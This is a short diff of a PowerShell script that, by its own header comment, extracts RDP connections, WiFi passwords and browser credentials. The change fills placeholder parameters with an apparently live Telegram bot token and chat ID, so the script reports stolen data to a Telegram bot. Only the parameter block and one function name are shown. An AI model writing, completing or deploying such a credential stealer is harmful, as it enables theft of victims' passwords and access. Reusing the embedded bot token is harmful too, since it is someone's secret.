@@ -2,8 +2,8 @@
 # This script extracts RDP connections, WiFi passwords, and browser credentials
 
 param(
-    [string]$TelegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN",
-    [string]$TelegramChatID = "YOUR_CHAT_ID"
+    [string]$TelegramBotToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
+    [string]$TelegramChatID = "2047893044"
 )
 
 function Get-PublicIPInfo {
